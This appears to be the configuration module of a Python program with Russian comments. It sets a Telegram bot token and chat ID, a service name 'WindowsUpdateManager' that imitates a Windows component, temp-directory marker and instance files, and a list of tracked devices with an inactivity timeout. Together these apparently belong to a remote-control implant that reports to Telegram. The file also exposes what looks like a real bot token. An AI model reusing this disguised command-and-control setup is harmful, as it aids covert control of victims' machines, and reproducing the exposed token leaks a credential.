import os
import tempfile

# Настройки Telegram бота
BOT_TOKEN = "8031189566:AAHwKCrgC4n_NRhOJBBcUFG40mzZeGUw9lw"  # Вставьте свой токен бота
CHAT_ID = "-4923513285"  # Вставьте свой ID чата

# Константы
SERVICE_NAME = "WindowsUpdateManager"
MARKER_FILE = os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
CHECK_INTERVAL = 300  # 5 минут для проверки watchdog
INTERNET_CHECK_TIMEOUT = 2  # Таймаут для проверки интернета

# Добавляем константы для уникального ID
INSTANCE_ID_FILE = os.path.join(tempfile.gettempdir(), "instance_id.dat")
INSTANCE_NAME_FILE = os.path.join(tempfile.gettempdir(), "instance_name.dat")

# Константы для списка устройств
DEVICES_LIST_FILE = os.path.join(tempfile.gettempdir(), "devices_list.json")
DEVICE_STATUS_TIMEOUT = 1800  # 30 минут - время, после которого устройство считается неактивным


